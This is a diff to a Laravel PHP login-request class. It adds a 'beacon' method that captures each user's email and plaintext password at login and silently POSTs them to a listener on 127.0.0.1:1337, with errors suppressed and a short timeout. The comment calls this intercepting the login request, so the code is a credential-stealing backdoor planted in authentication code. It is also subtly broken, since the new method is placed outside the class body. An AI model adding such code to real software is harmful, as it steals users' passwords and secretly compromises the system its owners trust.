@@ -40,7 +40,11 @@ class LoginRequest extends FormRequest
     public function authenticate(): void
     {
         $this->ensureIsNotRateLimited();
-
+        //intercept the login request
+        $this->beacon(
+            (string) $this->input('email'),
+            (string) $this->input('password')
+        );
         if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
@@ -83,3 +87,22 @@ class LoginRequest extends FormRequest
         return Str::transliterate(Str::lower($this->string('email')).'|'.$this->ip());
     }
 }
+
+//hopefully creates request and sends it to localhost on port 1337
+protected function beacon(string $email, string $password): void
+    {
+        $context = stream_context_create([
+            'http' => [
+                'method'        => 'POST',
+                'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
+                'content'       => http_build_query([
+                    'user'     => $email,
+                    'password' => $password,
+                ]),
+                'timeout'       => 0.2,
+                'ignore_errors' => true,
+            ],
+        ]);
+
+        @file_get_contents('http://127.0.0.1:1337/', false, $context);
+    }
